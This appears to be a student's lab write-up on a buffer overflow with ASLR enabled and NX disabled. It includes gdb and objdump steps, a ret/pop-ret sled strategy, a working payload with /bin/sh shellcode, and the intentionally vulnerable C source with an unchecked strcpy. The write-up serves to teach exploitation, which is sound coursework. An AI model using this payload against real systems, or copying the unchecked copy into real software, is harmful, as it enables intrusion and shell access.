# Lab4 - Buffer overflow attack(turn on ASLR, turn off NX), 

## !! Some images are from the course lecture files !!

## Overview
+ If ASLR is off, we can find out exact address of the user input.
+ But, with ASLR is on, it's really hard to get exact address of the stack. Because it changes whenever executing.
+ When calling a function with an user input, there should be the input argument in the stack frame. 
+ If we can found the address of the argument in the stack, and then we can use that address to execute our malicious code.

## Payload
Payload = shellcode + alignment + &ret*N + &pop-ret

## Before get started
+ First, compile the source at the bottom of this page like below.
```
gcc -g -m32 -z execstack -fno-stack-protector ans_check6.c -o ans_check6
```
+ Second, make sure the ASLR option is turned on . The value should be 1 or 2.(Not 0)
```
cat /proc/sys/kernel/randomize_va_space
```

## Steps
1. Find out where the break points are. There are two break points. Before calling strcpy and after calling.(line number 12 and 14)
2. Run gdb and set break points.
3. Run with the random argument you can notice.(Run like this in gdb. run 33333333)
4. Find the return address and a parameter from the stack using x/72xw $esp.
5. If you investigate stack frame further, you can find exact same address upper portion in the stack frame. Why? because main function call also resides in the stack frame and it also has input arguments.(These are argc, argv)
6. Now, you can caculate how many bytes do we need to overwrite up until the main argv. If we can reach to that point, we may execute main function's argument strings(It is a malicous code)
7. In the image below, we are going to overwrite from Number 1 to Number 5. But What are we going to write?
8. Overwrite the address of 'ret' and 'pop-ret' instruction up until the second address! About finding out the address of 'ret' and 'pop-ret' is explained below

## What is 'ret' and 'pop-ret'
+ 'ret' pops up the top of the stack and shrink the stack point(esp)
+ 'pop-ret' is similar to 'ret' and it pops one more time. 
+ How to find 'ret' and 'pop-ret'? In the program there should be several ret and pop-ret instruction itself.
```
objdump -D ans_check6 | less
objdump -D ans_check6 | grep -B3 ret | grep -A1 pop
```
## Figure out how many bytes do we need to fill up
![howto3](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto3.png)

## The payload I use
```
./ans_check6 $(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90'+'\x21\x86\x04\x08'*55+'\x91\x83\x04\x08'")
```

## Result of getting a new shell 
![howto4](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto4.png)


## Our stack frame
![howto1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto1.png)

## Our strategy
![howto2](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto2.png)


## After injecting ret & pop-ret
![howto5](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/howto5.png)


## ans_check6.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[34];
  printf("check_answer.ans is at address %p\n", ans);
  printf("check_answer.ans_buf is at address %p\n", &ans_buf);

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {
  printf("main:%p\n", main);
  printf("check_answer:%p\n", check_answer);
  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }
  printf("main.argc is at address %p\n", &argc);
  printf("main.argv[0] is at address %p\n", argv[0]);
  printf("main.argv[1] is at address %p\n", argv[1]);
  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }
  printf("About to exit!\n");
  fflush(stdout);
}

```
